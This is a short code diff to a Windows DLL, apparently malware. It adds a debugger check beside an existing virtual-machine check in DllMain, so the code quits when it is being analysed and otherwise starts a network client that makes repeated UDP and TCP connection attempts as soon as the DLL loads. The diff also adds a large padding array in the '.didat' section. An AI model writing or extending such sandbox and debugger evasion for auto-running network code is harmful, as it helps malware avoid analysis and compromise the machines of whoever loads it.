@@ -21,6 +21,7 @@
 
 #pragma data_seg(".didat")
 int _x = 0;
+int arr[100000] = { 0 };
 #pragma data_seg()
 
 const unsigned int MAX_CON_ATTEMPTS = 30; // how many times to try and send conection requuests to udp and tcp
@@ -36,7 +37,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     case DLL_PROCESS_ATTACH:        
 
         ProcessManager local;
-        if ( local.RunningInVirtualMachine() )
+        if ( local.RunningInVirtualMachine() || local.BeingDebugged() )
             break;
 
         std::unique_ptr<Client> me = std::make_unique<Client>();
